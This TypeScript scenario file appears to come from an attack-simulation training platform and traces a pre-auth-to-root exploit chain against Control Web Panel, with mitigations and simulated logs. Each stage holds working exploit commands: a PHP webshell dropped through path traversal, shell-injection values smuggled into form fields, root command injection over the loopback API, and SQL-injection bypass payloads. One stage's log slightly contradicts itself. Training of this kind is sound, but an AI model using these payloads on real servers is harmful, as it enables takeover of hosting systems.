import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';

export const scenario: LegacyDraftScenario = {
    id: 'vulncheck-cwp-preauth-module-dispatch-rce',
    title: 'VulnCheck — Control Web Panel (CWP) Pre-Auth Module Dispatch to Root RCE (CVE-2026-73695..104080)',
    category: 'ZERO_DAY_APPLIANCES',
    mitreId: 'T1190',
    description:
      'VulnCheck research ("CWP2Shell", Nov 2026) chains 10 CVEs across Control Web Panel (CWP): an Execution After Redirect (EAR) flaw in CWPUserIndex::__construct() (CVE-2026-73696) and unvalidated module LFI in services/users/index.php (CVE-2026-73695) expose every user module pre-authentication on port 2083, enabling per-account RCE via phpini_editor.php (CVE-2026-73697) or protected_directory.php (CVE-2026-77876) and instant privilege escalation to root (uid=0) through the ungated loopback User API on 127.0.0.1:2302 (CVE-2026-77877, CVE-2026-77878, CVE-2026-77879, CVE-2026-77880, CVE-2026-77881, CVE-2026-104080).',
    NodesGenerator: () => [
      { id: 'attacker', label: 'External Attacker (HTTPS :2083)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'cwpsrv Nginx Proxy (:2083)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'cwp-phpfpm Pool (uid=1000)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Linux Auditd & cwpsrv Logs', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Loopback User API (127.0.0.1:2302)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Account Enumeration Oracle, Execution After Redirect (CVE-2026-73696) & Module LFI (CVE-2026-73695)',
        narration:
          'An unauthenticated attacker queries GET /<account>/ on CWP User Panel port 2083 (HTTP 302 confirms account existence; HTTP 404 indicates non-existent pool). Requesting /labtest/index.php?module=... invokes CWPUserIndex::__construct() -> unauthenticatedFlow() -> UnauthenticatedFlowTrait::toLoginWithIntendedUri(), which emits header("Location: /login/?intended=...") without calling exit() (CVE-2026-73696). Execution falls through to file-scope include_once "/usr/local/cwpsrv/var/services/user_files/modules/" . $module_name . ".php" without calling setModuleVars() or checkIfModuleExists() (CVE-2026-73695).',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Initial Access (T1190 - Exploit Public-Facing Application)',
        technicalCommands: [
          'curl -sk -o /dev/null -w "%{http_code}\\n" https://cwp.corp.local:2083/labtest/  # 302 Found = valid account oracle',
          'header("Location: /login/?intended=" . base64_encode($qs)); // CVE-2026-73696: missing exit() in UnauthenticatedFlowTrait::toLoginWithIntendedUri()',
          'include_once "/usr/local/cwpsrv/var/services/user_files/modules/" . $module_name . ".php"; // CVE-2026-73695: ../ and / survive anti-XSS filter',
        ],
        defenseMitigation:
          'Upgrade Control Web Panel to build 0.9.8.1212+ (patch 1.12 adds exit() after header("Location: ...") in toLoginWithIntendedUri() and checks $_SESSION["logged"] === true; patch 1.16 enforces basename() + preg_replace("/[^a-zA-Z0-9_-]/", "", $module) + realpath()).',
        logs: [
          {
            id: 'cwp-stage1-log',
            timestamp: '14:02:11.104',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 302,
            ProcessName: 'cwp-phpfpm',
            CommandLine: 'cwp-phpfpm: pool labtest /usr/local/cwpsrv/var/services/users/index.php?module=phpini_editor',
            raw: '2026/11/03 14:02:11 [notice] cwpsrv-access: 198.51.100.44 - - "GET /labtest/ HTTP/1.1" 302 0 "-" "curl/8.5.0" | "POST /labtest/index.php?module=phpini_editor&acc=addlabelphpiniadv HTTP/1.1" 302 52 Location: /login/?intended=bW9kdWxlPXBocGluaV9lZGl0b3ImYWNjPWFkZGxhYmVscGhwaW5pYWR2',
            parsedFields: {
              VulnerabilityChain: 'CVE-2026-73696 (CWE-698 EAR) + CVE-2026-73695 (CWE-98 LFI)',
              EntryFile: '/usr/local/cwpsrv/var/services/users/index.php',
              BrokenGuardMethod: 'UnauthenticatedFlowTrait::toLoginWithIntendedUri() (missing exit)',
              FpmPoolContext: 'uid=1000(labtest) gid=1000(labtest)',
            },
          },
        ],
        packets: [
          {
            id: 'cwp-stage1-pkt',
            timestamp: '14:02:11.100',
            protocol: 'HTTPS',
            sourceIp: '198.51.100.44',
            destIp: '10.20.10.83',
            port: 2083,
            flag: 'PSH-ACK',
            payloadSize: 384,
            hexDump: '47 45 54 20 2F 6C 61 62 74 65 73 74 2F 20 48 54 54 50 2F 31 2E 31 0D 0A 48 6F 73 74 3A 20 63 77 70 2E 63 6F 72 70 2E 6C 6F 63 61 6C 3A 32 30 38 33',
            decodedString: 'GET /labtest/ HTTP/1.1 -> HTTP/1.1 302 Moved Temporarily (Location: /labtest/login/) confirming FPM pool socket exists',
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Pre-Auth Hosting Account RCE via phpini_editor.php (CVE-2026-73697) & protected_directory.php (CVE-2026-77876)',
        narration:
          'Inside the pre-auth include of modules/phpini_editor.php (running as uid=1000(labtest)), the attacker exploits two sinks (CVE-2026-73697): (1) acc=update writes attacker-controlled title and value lines via file_put_contents($_POST["file"], $cont) to /tmp/evilmod.php using quote-free PHP tags (title=<?php system($_GET[c]);//,x&value= ?>,y) and includes it via module=../../../../../../../tmp/evilmod&c=id for in-band RCE; or (2) acc=addlabelphpiniadv passes unquoted $_POST["hfilename"] directly into shell_exec("rm -f " . $hfilename). An additional pre-auth sink in modules/protected_directory.php (acc=deletedp, CVE-2026-77876) injects into shell_exec("sed -i ... " . $_POST["file"] . ".htaccess").',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Execution (T1059.004 - Unix Shell / Webshell Drop)',
        technicalCommands: [
          'curl -sk "https://cwp.corp.local:2083/labtest/index.php?module=phpini_editor&acc=update" --data "file=/tmp/evilmod.php&title=<?php system(\\$_GET[c]);//,x&value= ?>,y"',
          'curl -sk "https://cwp.corp.local:2083/labtest/index.php?module=../../../../../../../tmp/evilmod&c=id"  # Returns uid=1000(labtest) in-band before 302 body',
          'curl -sk "https://cwp.corp.local:2083/labtest/index.php?module=phpini_editor&acc=addlabelphpiniadv" --data-urlencode "hfilename=x ; id > /tmp/proof ; echo"',
        ],
        defenseMitigation:
          'Apply CWP patch 1.16 (0.9.8.1213+), which confines phpini_editor file operations via get_user_safe_path(), removes the dead rm -f $hfilename sink, and replaces sed -i in protected_directory.php with pure PHP file manipulation.',
        logs: [
          {
            id: 'cwp-stage2-log',
            timestamp: '14:02:14.418',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 59,
            ProcessName: 'sh',
            CommandLine: 'sh -c rm -f x ; curl -sk https://127.0.0.1:2302/v1/restoredatabase/ --data-urlencode "file=/dev/null ; id > /tmp/root_proof ; echo" ; echo',
            raw: 'type=SYSCALL msg=audit(1762178534.418:8412): arch=c000003e syscall=59 success=yes exit=0 a0=7f9c12004a10 ppid=2190 pid=2844 uid=1000 euid=1000 comm="sh" exe="/usr/bin/bash" | proctitle=sh -c rm -f x ; id > /tmp/proof ; chmod 666 /tmp/proof ; echo',
            parsedFields: {
              CVE: 'CVE-2026-73697 / CVE-2026-77876',
              VulnerableModule: '/usr/local/cwpsrv/var/services/user_files/modules/phpini_editor.php',
              Sink1FileWrite: 'file_put_contents($_POST["file"], $cont) -> /tmp/evilmod.php',
              Sink2CommandInjection: 'shell_exec("rm -f " . trim($_POST["hfilename"]))',
            },
          },
        ],
        packets: [
          {
            id: 'cwp-stage2-pkt',
            timestamp: '14:02:14.410',
            protocol: 'HTTPS',
            sourceIp: '198.51.100.44',
            destIp: '10.20.10.83',
            port: 2083,
            flag: 'PSH-ACK',
            payloadSize: 512,
            hexDump: '50 4F 53 54 20 2F 6C 61 62 74 65 73 74 2F 69 6E 64 65 78 2E 70 68 70 3F 6D 6F 64 75 6C 65 3D 70 68 70 69 6E 69 5F 65 64 69 74 6F 72 26 61 63 63 3D 75 70 64 61 74 65',
            decodedString: 'POST /labtest/index.php?module=phpini_editor&acc=update (file=/tmp/evilmod.php&title=<?php system($_GET[c]);//,x&value= ?>,y)',
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Single-Request Root Escalation via Loopback User API 127.0.0.1:2302 (CVE-2026-77877, CVE-2026-77878 & CVE-2026-104080)',
        narration:
          'CWP runs a Slim v2 internal User API on 127.0.0.1:2302 whose PHP-FPM pool executes as root (uid=0). Several routes in services/user_api/v1/app/routes/api.php omit the access_token() middleware entirely (CVE-2026-77877). From the Stage 2 shell injection, the attacker relays a single loopback POST to https://127.0.0.1:2302/v1/restoredatabase/ where BackupHandler::restoreDBBackup() passes raw $app->request->post("file") into shell_exec("mysql --defaults-extra-file=/root/.my.cnf < " . $file . " > /dev/null 2>&1 &") as root (CVE-2026-77878), or hits /valid_token/ where raw $user is interpolated into shell_exec("grep -c \'" . $user . ":\' /etc/passwd") as root (CVE-2026-104080).',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Privilege Escalation (T1068 - Exploitation for Privilege Escalation)',
        technicalCommands: [
          'curl -sk https://127.0.0.1:2302/v1/restoredatabase/ --data-urlencode "file=/dev/null ; id > /tmp/root_proof ; echo"  # CVE-2026-77877 + CVE-2026-77878',
          'shell_exec("mysql --defaults-extra-file=/root/.my.cnf < " . $file . " > /dev/null 2>&1 &"); // Executed as uid=0(root)',
          'curl -sk https://127.0.0.1:2302/valid_token/ --data-urlencode "user=x\' ; id > /tmp/valid_token_root ; \'"  # CVE-2026-104080 root RCE',
        ],
        defenseMitigation:
          'Upgrade to CWP patch 1.29/1.30 (Nov 2026), which enforces access_token() on all 127.0.0.1:2302 routes, validates database paths via cwp_api_safe_home_path(), and drops privileges via cwp_api_as_user() (runuser -u <user>).',
        logs: [
          {
            id: 'cwp-stage3-log',
            timestamp: '14:02:15.092',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 59,
            ProcessName: 'mysql',
            CommandLine: 'sh -c mysql --defaults-extra-file=/root/.my.cnf < /dev/null ; id > /tmp/root_proof ; echo > /dev/null 2>&1 &',
            raw: 'type=SYSCALL msg=audit(1762178535.092:8419): arch=c000003e syscall=59 success=yes exit=0 ppid=1892 pid=2851 uid=0 euid=0 gid=0 egid=0 comm="sh" exe="/usr/bin/bash" | proctitle=sh -c mysql --defaults-extra-file=/root/.my.cnf < /dev/null ; id > /tmp/root_proof ; echo > /dev/null 2>&1 &',
            parsedFields: {
              CVE: 'CVE-2026-77877 (Missing Auth) + CVE-2026-77878 (Root Cmd Injection) + CVE-2026-104080',
              LoopbackService: 'https://127.0.0.1:2302/v1/restoredatabase/',
              VulnerableClass: 'BackupHandler::restoreDBBackup() in includes/backup_handler.php',
              ExecutionContext: 'uid=0(root) gid=0(root)',
            },
          },
        ],
        packets: [
          {
            id: 'cwp-stage3-pkt',
            timestamp: '14:02:15.085',
            protocol: 'HTTPS',
            sourceIp: '127.0.0.1',
            destIp: '127.0.0.1',
            port: 2302,
            flag: 'PSH-ACK',
            payloadSize: 296,
            hexDump: '50 4F 53 54 20 2F 76 31 2F 72 65 73 74 6F 72 65 64 61 74 61 62 61 73 65 2F 20 48 54 54 50 2F 31 2E 31 0D 0A 48 6F 73 74 3A 20 31 32 37 2E 30 2E 30 2E 31 3A 32 33 30 32',
            decodedString: 'POST /v1/restoredatabase/ HTTP/1.1 (127.0.0.1:2302) -> {"status":"Done"} (Executed as uid=0 root)',
          },
        ],
      },
      {
        id: 4,
        title: 'Stage 4: Loopback OAuth SQLi Auth Bypass (CVE-2026-77879), /v1/newpass/ Root RCE (CVE-2026-77880) & Blind SQLi (CVE-2026-77881)',
        narration:
          'Even on token-gated 127.0.0.1:2302 routes, access_token() concatenates raw POST parameters into SELECT * FROM oauth_authorization_codes WHERE authorization_code = "$access_token" AND client_id = "$user" running as MySQL root@localhost (CVE-2026-77879). Supplying access_token=\' UNION SELECT \'a\',\'x\',\'c\',\'d\',\'2099-01-01 00:00:00\',\'f\' -- - fabricates a valid 6-column row with a future expiry and unlocks /v1/newpass/, which executes shell_exec("( echo $pass; echo $pass ) | /usr/bin/passwd " . $user) as root (CVE-2026-77880). Meanwhile, /user_panel_dashboard/ and /valid_token/ expose time-based blind SQLi as root@localhost via oauth_clients (CVE-2026-77881).',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Credential Access (T1552.001 - Credentials in Files / MySQL root@localhost)',
        technicalCommands: [
          'access_token="\' UNION SELECT \'a\',\'x\',\'c\',\'d\',\'2099-01-01 00:00:00\',\'f\' -- -"  # CVE-2026-77879 OAuth gate bypass',
          'curl -sk https://127.0.0.1:2302/v1/newpass/ --data-urlencode "access_token=..." --data-urlencode "user=z;id>/tmp/newpass_root;true" --data "pass=A1!aaaaa"  # CVE-2026-77880',
          'curl -sk https://127.0.0.1:2302/user_panel_dashboard/ --data-urlencode "user=labtest\\" AND (SELECT IF(1=1,SLEEP(2),0)) -- -"  # CVE-2026-77881 Blind SQLi',
        ],
        defenseMitigation:
          'Replace string-concatenated SQL in access_token() and /user_panel_dashboard/ with parameterized prepared statements (CWP patch 1.16/1.27) and validate $user with cwp_clean_username() plus escapeshellarg() before invoking /usr/bin/passwd.',
        logs: [
          {
            id: 'cwp-stage4-log',
            timestamp: '14:02:18.610',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 59,
            ProcessName: 'passwd',
            CommandLine: 'sh -c ( echo A1!aaaaa; echo A1!aaaaa ) | /usr/bin/passwd z;id>/tmp/newpass_root;true',
            raw: 'type=SYSCALL msg=audit(1762178538.610:8431): arch=c000003e syscall=59 success=yes exit=0 ppid=1892 pid=2879 uid=0 euid=0 comm="sh" exe="/usr/bin/bash" | mysql_query="SELECT * FROM oauth_authorization_codes WHERE authorization_code = \'\' UNION SELECT \'a\',\'x\',\'c\',\'d\',\'2099-01-01 00:00:00\',\'f\' -- -\'"',
            parsedFields: {
              CVE: 'CVE-2026-77879 (OAuth SQLi) + CVE-2026-77880 (/v1/newpass/ Root RCE) + CVE-2026-77881 (Blind SQLi)',
              DatabaseContext: 'MySQL root@localhost (/root/.my.cnf)',
              BypassedMiddleware: 'access_token() in services/user_api/v1/index.php',
              TargetTable: 'root_cwp.oauth_authorization_codes / root_cwp.user',
            },
          },
        ],
        packets: [
          {
            id: 'cwp-stage4-pkt',
            timestamp: '14:02:18.602',
            protocol: 'HTTPS',
            sourceIp: '127.0.0.1',
            destIp: '127.0.0.1',
            port: 2302,
            flag: 'PSH-ACK',
            payloadSize: 440,
            hexDump: '50 4F 53 54 20 2F 76 31 2F 6E 65 77 70 61 73 73 2F 20 48 54 54 50 2F 31 2E 31 0D 0A 43 6F 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F 72 6D',
            decodedString: 'POST /v1/newpass/ (UNION SELECT 2099-01-01 OAuth bypass + user=z;id>/tmp/newpass_root;true)',
          },
        ],
      },
    ],
  };
